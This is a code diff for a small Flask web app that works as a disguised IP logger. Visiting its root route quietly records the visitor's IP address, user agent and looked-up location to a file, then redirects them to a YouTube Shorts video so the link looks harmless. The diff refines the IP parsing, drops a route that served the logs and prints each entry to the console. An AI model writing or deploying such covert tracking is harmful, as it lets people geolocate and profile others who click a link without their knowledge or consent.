@@ -1,7 +1,6 @@
-from flask import Flask, request, redirect, Response
+from flask import Flask, request, redirect
 import requests
 from datetime import datetime
-import os
 
 app = Flask(__name__)
 
@@ -29,7 +28,7 @@ def get_location(ip):
 
 @app.route('/')
 def index():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
     user_agent = request.headers.get('User-Agent')
     info = get_location(ip)
 
@@ -43,17 +42,8 @@ def index():
     with open("logs.txt", "a") as file:
         file.write(log_entry + "\n")
 
+    print(log_entry)
     return redirect("https://youtube.com/shorts/9DegrMijHiQ?si=TH1nYJGltNQxbpbq")
-
-@app.route('/logs')
-def logs():
-    if not os.path.exists("logs.txt"):
-        return "No logs yet."
-
-    with open("logs.txt", "r") as file:
-        content = file.read()
-
-    return Response(content, mimetype='text/plain')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
